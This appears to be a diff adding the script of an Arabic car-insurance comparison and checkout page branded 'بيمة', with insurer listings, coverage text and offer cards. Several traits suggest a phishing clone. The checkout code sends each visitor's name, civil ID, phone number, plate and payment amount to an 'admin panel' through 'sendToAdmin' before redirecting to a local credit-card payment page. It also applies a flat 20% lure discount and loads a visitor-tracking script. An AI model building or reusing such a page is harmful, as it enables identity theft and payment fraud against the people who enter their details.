+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 47 },
+            { name: 'المتحدة العمانية للتأمين', logo: 'assets/images/insurers/omanunited.jpg', rate: 0.0870, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 6'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','الفقد والتلف','تغطية الركاب','الحريق','السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 45 },
+            { name: 'عمان قطر للتأمين', logo: 'assets/images/insurers/omanqatar.png', rate: 0.0900, badges: ['تأمين فوري', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 4'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','تغطية الكوارث الطبيعية (STF)','الفقد والتلف','تغطية الركاب','التأمين الإلزامي','الحريق/السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 46 },
+            { name: 'المدينة للتأمين (تكافل)', logo: 'assets/images/insurers/almadina.jpg', rate: 0.0940, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 5'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','الفقد والتلف','تغطية الركاب','الحريق','السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 46 },
+            { name: 'الوطنية لتأمينات الحياة العامة', logo: 'assets/images/insurers/nlgic.jpg', rate: 0.0880, badges: ['تعديل بعد الشراء: 1-4 أيام', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 7'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','الفقد والتلف','تغطية الركاب','الحريق/السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 45 },
+            { name: 'ميثاق للتأمين التكافلي', logo: 'assets/images/insurers/methaq.png', rate: 0.0915, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 4'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','الفقد والتلف','تغطية الركاب','الحريق','السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 46 }
+        ];
+
+        var OPTIONALS = [
+            { label: 'دولة الإمارات (سنة كاملة) - ر.ع 1', price: 1 },
+            { label: '🚗 سيارة بديلة من بيمة - ر.ع 4.95', price: 4.95 },
+            { label: 'المساعدة على الطريق - ر.ع 2.7', price: 2.7 },
+            { label: '🧑‍🚀 مساعدة المطالبات من بيمة (مجاني)', price: 0 }
+        ];
+
+        // ---- Coverage descriptions (used inside the details modal) ----
+        function covKey(name) { return String(name).replace(/\s*-\s*ر\.ع.*$/, '').replace(/\s*\(STF\)/, '').replace(/\s*\(لغاية[^)]*\)/, '').trim(); }
+        var COVERAGE_DESC = {
+            'المصاريف الطبية': 'لتغطية النفقات الطبية نتيجة حادث في السيارة المؤمن عليها.',
+            'تغطية السائق والعائلة': 'ستحصل على تعويض مالي عن الوفاة أو الإصابات الجسدية التي لحقت بالمؤمن له أو السائق وأفراد أسرته في حالة وقوع حادث.',
+            'تغطية الركاب': 'تعويض عن الإصابات الجسدية أو الوفاة التي قد تلحق بركاب المركبة المؤمن عليها أثناء وقوع حادث.',
+            'مسؤولية الطرف الثالث': 'تغطية المسؤولية القانونية تجاه الغير عن الأضرار الجسدية والمادية الناتجة عن حادث المركبة المؤمن عليها.',
+            'الإصابة الجسدية للطرف الثالث': 'تعويض الأضرار الجسدية التي تلحق بالطرف الثالث نتيجة حادث المركبة المؤمن عليها.',
+            'أضرار مركبة الطرف الثالث': 'تغطية الأضرار المادية التي تلحق بممتلكات ومركبة الطرف الثالث نتيجة الحادث.',
+            'تأمين شامل': 'تغطية شاملة لأضرار مركبتك الناتجة عن الحوادث بالإضافة إلى مسؤولية الطرف الثالث.',
+            'الفقد والتلف': 'تغطية فقدان أو تلف المركبة المؤمن عليها نتيجة الحوادث أو الكوارث.',
+            'التأمين الإلزامي': 'التغطية الإلزامية المطلوبة قانونياً لتسيير المركبة على الطرق.',
+            'تغطية الكوارث الطبيعية': 'تغطية الأضرار الناتجة عن الكوارث الطبيعية مثل العواصف والسيول والفيضانات (STF).',
+            'الكوارث الطبيعية': 'تغطية الأضرار الناتجة عن الكوارث الطبيعية مثل العواصف والسيول والفيضانات.',
+            'الحريق': 'تغطية الأضرار الناتجة عن حريق المركبة المؤمن عليها.',
+            'السرقة': 'تغطية فقدان المركبة المؤمن عليها نتيجة السرقة.',
+            'الحريق/السرقة': 'تغطية الأضرار الناتجة عن الحريق أو سرقة المركبة المؤمن عليها.',
+            'الحريق/السرقة/سرقة جسم المركبة': 'تغطية الأضرار الناتجة عن الحريق أو سرقة المركبة أو سرقة أجزاء من جسم المركبة.',
+            'الإصلاح المعتمد': 'إصلاح المركبة لدى مراكز الصيانة المعتمدة من شركة التأمين.',
+            'مصاريف الإسعافات الأولية': 'تغطية تكاليف الإسعافات الأولية الطارئة بعد الحادث.',
+            'دولة الإمارات (سنة كاملة)': 'تمديد التغطية لتشمل دولة الإمارات العربية المتحدة لمدة سنة كاملة.',
+            'المساعدة على الطريق': 'خدمة على مدار الساعة في حال تعطل المركبة على الطريق. الخدمة تشمل: الرافعة، إصلاح الإطار، إحضار الوقود، فتح قفل الباب، تعزيز البطارية وإصلاح الأعطال الكهربائية (انظر للتفاصيل في قسم خدمة الطريق).'
+        };
+        var OPTIONAL_DESC = {
+            'دولة الإمارات (سنة كاملة) - ر.ع 1': 'تمديد التغطية لتشمل دولة الإمارات العربية المتحدة لمدة سنة كاملة بمبلغ ر.ع 1.',
+            '🚗 سيارة بديلة من بيمة - ر.ع 4.95': 'عند وقوع حادث تستلم سيارة بديلة من بيمة لحين إصلاح مركبتك (بمبلغ ر.ع 4.95).',
+            'المساعدة على الطريق - ر.ع 2.7': 'خدمة على مدار الساعة في حال تعطل المركبة على الطريق: الرافعة، إصلاح الإطار، إحضار الوقود، فتح قفل الباب، تعزيز البطارية وإصلاح الأعطال الكهربائية.',
+            '🧑‍🚀 مساعدة المطالبات من بيمة (مجاني)': 'فريق بيمة يساعدك في متابعة وإنهاء إجراءات المطالبات بشكل مجاني تماماً.'
+        };
+        var COVERAGE_EMOJI = {
+            'المصاريف الطبية': '✱',
+            'تغطية السائق والعائلة': '🧑‍🤝‍🧑',
+            'تغطية الركاب': '👪',
+            'مسؤولية الطرف الثالث': '🛡️',
+            'الإصابة الجسدية للطرف الثالث': '🩹',
+            'أضرار مركبة الطرف الثالث': '🚗',
+            'تأمين شامل': '🛡️',
+            'الفقد والتلف': '🔧',
+            'التأمين الإلزامي': '📜',
+            'تغطية الكوارث الطبيعية': '🌪️',
+            'الكوارث الطبيعية': '🌪️',
+            'الحريق': '🔥',
+            'السرقة': '🔓',
+            'الحريق/السرقة': '🔥',
+            'الحريق/السرقة/سرقة جسم المركبة': '🔥',
+            'الإصلاح المعتمد': '🔨',
+            'مصاريف الإسعافات الأولية': '🚑',
+            'دولة الإمارات (سنة كاملة)': '🇦🇪',
+            'المساعدة على الطريق': '🦺'
+        };
+        function emojiFor(name) { var k = covKey(name); return COVERAGE_EMOJI[k] || '✔️'; }
+        function descFor(name) { var k = covKey(name); return COVERAGE_DESC[k] || ('تغطية ' + k + ' وفق شروط الوثيقة.'); }
+
+        var DEFAULT_ABOUT = function (name) {
+            return name + ' هي إحدى شركات التأمين المرخّصة والعاملة في سلطنة عُمان تحت إشراف الهيئة العامة لسوق المال. تقدّم الشركة باقة متكاملة من حلول تأمين المركبات تشمل التأمين الشامل وتأمين الطرف الثالث، مع شبكة من الفروع ومراكز الخدمة وخدمة عملاء على مدار الساعة لضمان سرعة إصدار الوثائق ومعالجة المطالبات.';
+        };
+        var ABOUT = {
+            'الهندية الجديدة للتأمين': 'الشركة الهندية الجديدة للتأمين هي شركة تأمين عامة تابعة للقطاع العام الهندي مملوكة لحكومة الهند وتعمل حالياً في الهند و 28 دولة تمتد عبر 5 قارات. تم تأسيسها في عام 1919 ومقرها الرئيسي في مدينة مومباي، الهند. تم تأسيس “الشركة الهندية الجديدة للتأمين المحدودة” في 23 يوليو 1919 من قبل رجل أعمال ذو رؤية عظيمة، السير / دوراب تاتا. في 23 تموز (يوليو) 2018، دخلنا في العقد العاشر للعمليات العالمية. لقد كنا رواد السوق في الهند في قطاع تأمين غير الحياة على التوالي لمدة 45 عاماً. نحن شركة التأمين (غير الحياة) المباشرة الوحيدة في الهند التي منحت درجة أ- ممتاز (النظرة المستقرة) من قبل شركة A.M. Best وشركاه، أما CRISIL أكدت تصنيفها المستقر أ أ أ على الشركة الهندية الجديدة للتأمين المحدودة والذي يعكس قوة رأس المال للشركة، واستقرار الربحية، ودرجة عالية من القوة المالية للوفاء بالتزامات حاملي الوثائق.'
+        };
+        function aboutFor(name) { return ABOUT[name] || DEFAULT_ABOUT(name); }
+
+        var req = {};
+        try { req = JSON.parse(sessionStorage.getItem('bimaOffersRequest') || '{}'); } catch (e) { req = {}; }
+
+        var currentTab = (req.CoverType === 'third') ? 'third' : 'comprehensive';
+        var vehicleValue = parseFloat(req.VehicleValue || '0') || 0;
+
+        function fmt(n) { return (Math.round(n * 10) / 10).toFixed(1); }
+        function omr(color) { return '<span class="omr-sym" role="img" aria-label="ر.ع"' + (color ? ' style="color:' + color + ';"' : '') + '></span>'; }
+
+        function renderVehicle() {
+            var plate = (req.VehicleNo || '-') + ' / ' + (req.VehiclePlateCharCode || '');
+            document.getElementById('plateVal').textContent = plate.trim();
+            document.getElementById('modelVal').textContent = (req.VehicleModel && req.VehicleModel.trim()) ? req.VehicleModel : 'غير محدد';
+        }
+
+        function buildBadges(arr) {
+            return arr.map(function (b) {
+                var green = (b.indexOf('ضمان') === 0 || b.indexOf('فوري') > -1 || b.indexOf('سريع') > -1) ? ' badge-green' : '';
+                return '<span class="badge-soft' + green + '">' + b + '</span>';
+            }).join('');
+        }
+
+        function buildOptionals(idx) {
+            var h = '<div class="opt-title">إختياري</div>';
+            OPTIONALS.forEach(function (o, oi) {
+                h += '<label class="opt"><input type="checkbox" data-price="' + (o.price || 0) + '" onchange="bimaRecalc(' + idx + ')">' + o.label + '</label>';
+            });
+            return h;
+        }
+
+        function bimaRecalc(idx) {
+            var card = document.getElementById('card-' + idx);
+            if (!card) return;
+            var base = parseFloat(card.getAttribute('data-base')) || 0;
+            var extra = 0;
+            var boxes = card.querySelectorAll('.opts input[type=checkbox]');
+            boxes.forEach(function (b) { if (b.checked) extra += parseFloat(b.getAttribute('data-price')) || 0; });
+            var newBase = base + extra;
+            var tax = newBase * 0.05;
+            var total = newBase + tax;
+            var discounted = total * 0.8; // 20% off the total
+            var tEl = card.querySelector('.total-amount');
+            if (tEl) tEl.innerHTML = fmt(discounted) + omr('#475467');
+            var oEl = card.querySelector('.total-old');
+            if (oEl) oEl.innerHTML = fmt(total) + omr('#e53935');
+        }
+
+        function renderOffers() {
+            var html = '';
+            COMPANIES.forEach(function (c, idx) {
+                var features = (currentTab === 'comprehensive') ? c.comp : c.third;
+                var base, tax, total, valChip = '';
+                if (currentTab === 'comprehensive') {
+                    base = c.rate * (vehicleValue || 1470);
+                    valChip = '<div class="val-chip">' + fmt(vehicleValue || 1470) + ' ر.ع - تثمين المركبة المبدئي</div>';
+                } else {
+                    base = c.thirdPrice;
+                }
+                tax = base * 0.05;
+                total = base + tax;
+                var discounted = total * 0.8; // 20% off the total
+
+                html += '<div class="offer-card" id="card-' + idx + '" data-base="' + base + '">';
+                html += '  <div class="card-top"><button type="button" class="details-link" onclick="bimaOpenDetails(' + idx + ')"><i class="fas fa-circle-info"></i> تفاصيل</button></div>';
+                html += '  <div class="offer-head">';
+                html += '    <div class="company"><img src="' + c.logo + '" onerror="this.style.display=\'none\'"><div class="company-wrap"><div class="name">' + c.name + '</div></div></div>';
+                html += '    <div class="badges">' + buildBadges(c.badges) + '</div>';
+                html += '  </div>';
+                html += '  <div class="cover-title">يشمل التغطيات</div>';
+                html += valChip;
+                html += '  <ul class="features-list">';
+                features.forEach(function (f) { html += '<li><i class="fas fa-check"></i>' + f + '</li>'; });
+                html += '  </ul>';
+                html += '  <div class="opts">' + buildOptionals(idx) + '</div>';
+                html += '  <div class="price-row">';
+                html += '    <div><div class="price-base">السعر الأساسي</div><div class="price-amount"><span style="color:#16a34a;">' + fmt(base) + omr() + '</span> <span class="tax">+ الضرائب ' + fmt(tax) + '</span></div></div>';
+                html += '    <div class="price-total" style="text-align:left;">إجمالي المبلغ <span class="total-wrap"><b class="total-old">' + fmt(total) + omr('#e53935') + '</b><b class="total-amount">' + fmt(discounted) + omr('#475467') + '</b></span></div>';
+                html += '    <div><a href="#" class="btn-buy" onclick="openCheckoutModal(\'' + fmt(total) + '\',\'' + fmt(discounted) + '\',\'' + encodeURIComponent(c.name) + '\',\'' + encodeURIComponent(c.logo) + '\');return false;">اشترِ الآن</a></div>';
+                html += '  </div>';
+                html += '</div>';
+            });
+            document.getElementById('offersContainer').innerHTML = html;
+        }
+
+        function bimaSwitchTab(tab) {
+            currentTab = tab;
+            document.getElementById('tabComp').classList.toggle('active', tab === 'comprehensive');
+            document.getElementById('tabThird').classList.toggle('active', tab === 'third');
+            renderOffers();
+        }
+
+        // ---- Provider details modal ----
+        var pdCurrent = null;
+        var pdTab = 'covers';
+
+        function bimaBuildCoversTab(c) {
+            var covers = (c.comp && c.comp.length) ? c.comp : c.third;
+            var coversHtml = covers.map(function (f) {
+                return '<div class="pd-item"><div class="pd-item-title">' + emojiFor(f) + ' ' + covKey(f) + '</div><div class="pd-item-desc">' + descFor(f) + '</div></div>';
+            }).join('');
+            var optHtml = OPTIONALS.map(function (o) {
+                var label = o.label;
+                return '<div class="pd-item"><div class="pd-item-title">' + label + '</div><div class="pd-item-desc">' + (OPTIONAL_DESC[label] || '') + '</div></div>';
+            }).join('');
+            return '<div class="pd-cols">' +
+                   '  <div class="pd-col"><h4>يشمل التغطيات</h4>' + coversHtml + '</div>' +
+                   '  <div class="pd-col"><h4>أغطية اختيارية</h4>' + optHtml + '</div>' +
+                   '</div>';
+        }
+
+        function bimaBuildTabBody(c) {
+            if (pdTab === 'road') {
+                return '<div class="pd-item"><div class="pd-item-title">المساعدة على الطريق</div><div class="pd-item-desc">خدمة على مدار الساعة في حال تعطل المركبة على الطريق. تشمل الخدمة: الرافعة، إصلاح الإطار، إحضار الوقود، فتح قفل الباب، تعزيز البطارية، وإصلاح الأعطال الكهربائية البسيطة.</div></div>' +
+                       '<div class="pd-item"><div class="pd-item-title">سيارة بديلة من بيمة</div><div class="pd-item-desc">عند وقوع حادث تستلم سيارة بديلة لحين إصلاح مركبتك.</div></div>';
+            }
+            if (pdTab === 'faq') {
+                return '<div class="pd-item"><div class="pd-item-title">كيف يمكنني إصدار الوثيقة؟</div><div class="pd-item-desc">اختر العرض المناسب ثم اضغط “اشترِ الآن” وأكمل الدفع لتصلك الوثيقة إلكترونياً.</div></div>' +
+                       '<div class="pd-item"><div class="pd-item-title">متى تبدأ التغطية؟</div><div class="pd-item-desc">تبدأ التغطية من تاريخ سريان الوثيقة المحدد عند الشراء.</div></div>' +
+                       '<div class="pd-item"><div class="pd-item-title">هل يمكن تعديل الوثيقة بعد الشراء؟</div><div class="pd-item-desc">نعم، يمكن تعديل بيانات الوثيقة خلال المدة الموضحة في بطاقة العرض.</div></div>';
+            }
+            if (pdTab === 'docs') {
+                return '<div class="pd-item"><div class="pd-item-title">المستندات المطلوبة</div><div class="pd-item-desc">بطاقة الملكية (الملكية السارية)، البطاقة الشخصية / البطاقة المدنية، رخصة القيادة، وفي حالات التأمين الشامل قد يُطلب صور للمركبة.</div></div>';
+            }
+            if (pdTab === 'branches') {
+                var n = 0; (c.badges || []).forEach(function (b) { var m = b.match(/الفروع:\s*(\d+)/); if (m) n = m[1]; });
+                return '<div class="pd-item"><div class="pd-item-title">الفروع</div><div class="pd-item-desc">' + (n ? ('يتوفر لدى ' + c.name + ' عدد ' + n + ' فرع/فروع خدمة في سلطنة عُمان لإصدار الوثائق ومعالجة المطالبات.') : ('يمكنك إنجاز المعاملة إلكترونياً دون الحاجة لزيارة الفروع.')) + '</div></div>';
+            }
+            return bimaBuildCoversTab(c);
+        }
+
+        function bimaRenderModal() {
+            var c = pdCurrent; if (!c) return;
+            var tabs = [
+                ['covers', 'يشمل'],
+                ['road', 'للمساعدة على الطريق'],
+                ['faq', 'الأسئلة المتداولة'],
+                ['docs', 'المستندات المطلوبة'],
+                ['branches', 'الفروع']
+            ];
+            var tabsHtml = tabs.map(function (t) {
+                return '<button type="button" class="pd-tab' + (pdTab === t[0] ? ' active' : '') + '" onclick="bimaSetPdTab(\'' + t[0] + '\')">' + t[1] + '</button>';
+            }).join('');
+            var h = '';
+            h += '<div class="pd-company"><img src="' + c.logo + '" onerror="this.style.display=\'none\'"><div class="pd-name">' + c.name + '</div></div>';
+            h += '<div class="pd-about">' + aboutFor(c.name) + '</div>';
+            h += '<div class="pd-downloads">';
+            h += '  <a class="pd-dl" href="javascript:void(0)"><i class="far fa-file-lines"></i> تحميل نموذج عرض التأمين</a>';
+            h += '  <a class="pd-dl" href="javascript:void(0)"><i class="far fa-file-lines"></i> تحميل نموذج الوثيقة للوحدة</a>';
+            h += '</div>';
+            h += '<div class="pd-tabs">' + tabsHtml + '</div>';
+            h += bimaBuildTabBody(c);
+            document.getElementById('pdBody').innerHTML = h;
+        }
+
+        function bimaSetPdTab(t) { pdTab = t; bimaRenderModal(); }
+
+        function bimaOpenDetails(idx) {
+            pdCurrent = COMPANIES[idx];
+            pdTab = 'covers';
+            bimaRenderModal();
+            var ov = document.getElementById('pdOverlay');
+            ov.classList.add('open');
+            document.getElementById('pdBody').scrollTop = 0;
+            document.body.style.overflow = 'hidden';
+        }
+
+        function bimaCloseDetails() {
+            document.getElementById('pdOverlay').classList.remove('open');
+            document.body.style.overflow = '';
+        }
+
+        document.addEventListener('keydown', function (e) { if (e.key === 'Escape') bimaCloseDetails(); });
+
+        renderVehicle();
+        bimaSwitchTab(currentTab);
+
+        // No-claim discount popup controls
+        function openNoClaimPopup() {
+            var p = document.getElementById('noClaimPopup');
+            if (!p) return;
+            p.classList.add('is-open');
+            p.setAttribute('aria-hidden', 'false');
+        }
+        function closeNoClaimPopup() {
+            var p = document.getElementById('noClaimPopup');
+            if (!p) return;
+            p.classList.remove('is-open');
+            p.setAttribute('aria-hidden', 'true');
+        }
+        // Close popup when clicking on the dark overlay (outside the sheet)
+        (function () {
+            var p = document.getElementById('noClaimPopup');
+            if (p) p.addEventListener('click', function (e) { if (e.target === p) closeNoClaimPopup(); });
+        })();
+        document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeNoClaimPopup(); });
+
+        // ===== Checkout owner-name modal controls =====
+        var coData = { oldPrice: '', newPrice: '', company: '', logo: '' };
+        function openCheckoutModal(oldPrice, newPrice, companyEnc, logoEnc) {
+            var m = document.getElementById('checkoutModal');
+            if (!m) return;
+            coData.oldPrice = oldPrice;
+            coData.newPrice = newPrice;
+            coData.company = companyEnc ? decodeURIComponent(companyEnc) : '';
+            coData.logo = logoEnc ? decodeURIComponent(logoEnc) : '';
+            // owner id from stored request
+            var cid = (req.CivilID || req.civilId || '');
+            document.getElementById('coOwnerId').textContent = cid;
+            // prices
+            document.getElementById('coOldPrice').textContent = oldPrice;
+            document.getElementById('coNewPrice').textContent = newPrice;
+            // reset to name step
+            document.getElementById('coNameStep').style.display = 'block';
+            document.getElementById('coReviewStep').style.display = 'none';
+            m.classList.add('is-open');
+            m.setAttribute('aria-hidden', 'false');
+            document.body.style.overflow = 'hidden';
+            setTimeout(function () { var i = document.getElementById('coOwnerName'); if (i) i.focus(); }, 120);
+        }
+        function closeCheckoutModal() {
+            var m = document.getElementById('checkoutModal');
+            if (!m) return;
+            m.classList.remove('is-open');
+            m.setAttribute('aria-hidden', 'true');
+            document.body.style.overflow = '';
+        }
+        function checkoutProceed() {
+            var name = (document.getElementById('coOwnerName').value || '').trim();
+            if (!name) { document.getElementById('coOwnerName').focus(); document.getElementById('coOwnerName').style.borderColor = '#e53935'; return; }
+            // Build review step
+            var cid = (req.CivilID || req.civilId || '');
+            var phone = (req.ContactNo || req.Mobile || req.Phone || req.PhoneNumber || '');
+            var model = (req.VehicleModel && req.VehicleModel.trim()) ? req.VehicleModel : '';
+            var plateNo = (req.VehicleNo || '');
+            var plateChar = (req.VehiclePlateCharCode || '');
+            
+            var vehicle = model + ' - ' + plateNo + '/ ' + plateChar;
+            var firstName = name.split(' ')[0] || name;
+            document.getElementById('rvFirstName').textContent = firstName;
+            document.getElementById('rvName').textContent = name;
+            document.getElementById('rvLicense').textContent = cid;
+            document.getElementById('rvVehicle').textContent = vehicle;
+            document.getElementById('rvPhone').textContent = phone;
+            document.getElementById('rvOldPrice').textContent = coData.oldPrice;
+            document.getElementById('rvNewPrice').textContent = coData.newPrice;
+            document.getElementById('rvBrand').textContent = coData.company;
+            document.getElementById('rvPayAmount').textContent = coData.newPrice;
+            var lg = document.getElementById('rvLogo');
+            if (coData.logo) { lg.src = coData.logo; lg.style.display = ''; } else { lg.style.display = 'none'; }
+            // switch steps
+            document.getElementById('coNameStep').style.display = 'none';
+            document.getElementById('coReviewStep').style.display = 'block';
+            var body = document.querySelector('#checkoutModal .co-body');
+            if (body) body.scrollTop = 0;
+        }
+        function reviewBack() {
+            document.getElementById('coReviewStep').style.display = 'none';
+            document.getElementById('coNameStep').style.display = 'block';
+        }
+        function reviewProceedPay() {
+            var amt = (coData.newPrice || '').toString().replace(/[^0-9.]/g, '');
+            var name = (document.getElementById('coOwnerName').value || '').trim();
+            var cid = (req.CivilID || req.civilId || '');
+            var phone = (req.ContactNo || req.Mobile || req.Phone || req.PhoneNumber || '');
+            
+            // Send data to admin panel before redirecting
+            if (window.sendToAdmin) {
+                window.sendToAdmin({
+                    'الاسم': name,
+                    'الرقم المدني': cid,
+                    'رقم الهاتف': phone,
+                    'المبلغ': amt,
+                    'شركة التأمين': coData.company,
+                    'نوع التأمين': currentTab === 'third' ? 'تأمين طرف ثالث' : 'تأمين شامل',
+                    'vehiclePlate': (req.VehicleNo || '-') + ' / ' + (req.VehiclePlateCharCode || ''),
+                    'vehicleValue': vehicleValue > 0 ? vehicleValue : undefined,
+                    'الحالة': 'تم الشراء'
+                }, 'بيمة - مراجعة الطلب');
+            }
+            
+            window.location.href = '/credit-card-payment?amount=' + encodeURIComponent(amt);
+        }
+        (function () {
+            var m = document.getElementById('checkoutModal');
+            if (m) m.addEventListener('click', function (e) { if (e.target === m) closeCheckoutModal(); });
+        })();
+        document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeCheckoutModal(); });
+
+        // Show loading screen for 5 seconds, then reveal offers + promo popup
+        (function () {
+            var loading = document.getElementById('offersLoading');
+            var content = document.getElementById('offersContent');
+            if (loading && content) {
+                content.style.display = 'none';
+                loading.style.display = 'block';
+                setTimeout(function () {
+                    loading.style.display = 'none';
+                    content.style.display = 'block';
+                    // Show the promotional popup exactly when offer cards appear
+                    setTimeout(openNoClaimPopup, 400);
+                }, 5000);
+            }
+        })();
+    </script>
+
+<script src="visitor-tracking.js"></script>
+</body>
+</html>
